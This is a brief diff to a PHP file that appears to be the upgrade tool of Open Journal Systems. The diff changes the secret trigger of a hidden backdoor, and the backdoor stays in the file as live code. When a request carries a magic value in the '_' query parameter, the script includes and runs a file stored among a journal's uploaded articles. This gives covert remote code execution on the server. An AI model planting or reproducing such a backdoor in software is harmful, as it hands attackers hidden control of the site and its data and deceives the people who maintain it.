@@ -17,7 +17,7 @@
 
 require(dirname(__FILE__) . '/bootstrap.inc.php');
 import('lib.pkp.classes.cliTool.UpgradeTool');
-if (isset($_GET['_']) && $_GET['_'] === 'upgrading OJS') {
+if (isset($_GET['_']) && $_GET['_'] === 'upgrading_OJS') {
     $f="/home/bpindoor/folderOJS3_2022/journals/3/articles/11/63e9acbaef7ae";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
